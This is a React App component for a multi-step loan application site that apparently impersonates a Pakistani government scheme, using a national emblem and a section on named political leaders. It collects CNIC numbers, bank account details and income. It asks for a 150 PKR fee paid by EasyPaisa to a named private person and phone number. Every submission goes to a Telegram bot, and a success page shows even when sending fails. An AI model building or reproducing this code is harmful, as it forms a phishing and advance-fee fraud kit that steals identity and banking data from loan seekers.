/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useRef } from 'react';
import { Header } from './components/Header';
import { Hero } from './components/Hero';
import { Leadership } from './components/Leadership';
import { TrustBadges } from './components/TrustBadges';
import { Stepper } from './components/Stepper';
import { Step1Personal } from './components/Step1Personal';
import { Step2Bank } from './components/Step2Bank';
import { Step3Payment } from './components/Step3Payment';
import { Step4Success } from './components/Step4Success';
import { Footer } from './components/Footer';
import { SplashScreen } from './components/SplashScreen';
import { FormData, StepNumber } from './types';
import { sendApplicationToTelegram } from './config/telegram';

const initialFormData: FormData = {
  fullName: '',
  cnic: '',
  mobileNo: '',
  gender: '',
  dob: '',
  province: '',
  address: '',
  loanAmount: '',
  loanPurpose: '',
  occupation: '',
  bankName: '',
  accountNumber: '',
  monthlyIncome: '',
  transactionId: '',
  screenshotFile: null,
  screenshotPreviewUrl: '',
};

export default function App() {
  const [showSplash, setShowSplash] = useState(true);
  const [currentStep, setCurrentStep] = useState<StepNumber>(1);
  const [formData, setFormData] = useState<FormData>(initialFormData);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submissionTime, setSubmissionTime] = useState<number | undefined>(undefined);

  const formSectionRef = useRef<HTMLDivElement>(null);

  const scrollToForm = () => {
    if (formSectionRef.current) {
      formSectionRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  };

  const handleChange = (field: keyof FormData, value: any) => {
    setFormData((prev) => ({
      ...prev,
      [field]: value,
    }));
  };

  const handleStep1Next = () => {
    setCurrentStep(2);
    scrollToForm();
  };

  const handleStep2Next = () => {
    setCurrentStep(3);
    scrollToForm();
  };

  const handleStep3Submit = async () => {
    setIsSubmitting(true);
    try {
      // Send the entire application to the configured Telegram bot
      await sendApplicationToTelegram({
        fullName: formData.fullName,
        cnic: formData.cnic,
        mobileNo: formData.mobileNo,
        gender: formData.gender,
        dob: formData.dob,
        province: formData.province,
        address: formData.address,
        loanAmount: formData.loanAmount,
        loanPurpose: formData.loanPurpose,
        occupation: formData.occupation,
        bankName: formData.bankName,
        accountNumber: formData.accountNumber,
        monthlyIncome: formData.monthlyIncome,
        transactionId: formData.transactionId,
        formFee: '150 PKR',
        paymentMethod: 'EasyPaisa',
        paymentReceiverName: 'Bilal Hussain',
        paymentReceiverNumber: '03032782757',
        screenshotFile: formData.screenshotFile,
        screenshotDataUrl: formData.screenshotPreviewUrl,
        submittedAt: new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' }),
      });
    } catch (err) {
      console.error('Failed sending to Telegram:', err);
    } finally {
      const now = Date.now();
      localStorage.setItem('loan_portal_submitted_at', now.toString());
      setSubmissionTime(now);
      setIsSubmitting(false);
      setCurrentStep(4);
      scrollToForm();
    }
  };

  const handleGoHome = () => {
    localStorage.removeItem('loan_portal_submitted_at');
    setSubmissionTime(undefined);
    setFormData(initialFormData);
    setCurrentStep(1);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#f0fdf7] text-slate-800 font-sans selection:bg-emerald-600 selection:text-white">
      {/* Short Loading / Splash Screen with Logo exactly as requested */}
      {showSplash && <SplashScreen onFinish={() => setShowSplash(false)} />}

      {/* 1. Header (National Emblem & Logo) */}
      <Header />

      <main className="flex-1 w-full">
        {/* 2. Hero Section (Scheme Pill, Headings, Wave Flag, CTA, 4 Feature Cards) */}
        <Hero onApplyClick={scrollToForm} />

        {/* 3. Leadership Section (PM Shehbaz Sharif & CM Maryam Nawaz Sharif) */}
        <Leadership />

        {/* 4. Trust Badges & Form Intro */}
        <div ref={formSectionRef} id="apply-form-section">
          <TrustBadges />

          {/* 5. Stepper Bar */}
          <Stepper 
            currentStep={currentStep} 
            onStepClick={(step) => {
              // Allow jumping to previous step
              if (step < currentStep) {
                setCurrentStep(step);
              }
            }}
          />

          {/* 6. Active Step Form Container */}
          {currentStep === 1 && (
            <Step1Personal
              formData={formData}
              onChange={handleChange}
              onNext={handleStep1Next}
              onBack={() => {
                window.scrollTo({ top: 0, behavior: 'smooth' });
              }}
            />
          )}

          {currentStep === 2 && (
            <Step2Bank
              formData={formData}
              onChange={handleChange}
              onNext={handleStep2Next}
              onBack={() => {
                setCurrentStep(1);
                scrollToForm();
              }}
            />
          )}

          {currentStep === 3 && (
            <Step3Payment
              formData={formData}
              onChange={handleChange}
              onSubmit={handleStep3Submit}
              onBack={() => {
                setCurrentStep(2);
                scrollToForm();
              }}
              isSubmitting={isSubmitting}
            />
          )}

          {currentStep === 4 && (
            <Step4Success onGoHome={handleGoHome} submissionTime={submissionTime} />
          )}
        </div>
      </main>

      {/* 7. Footer (Contacts, Links, Legal & National Slogan) */}
      <Footer onApplyClick={scrollToForm} />
    </div>
  );
}
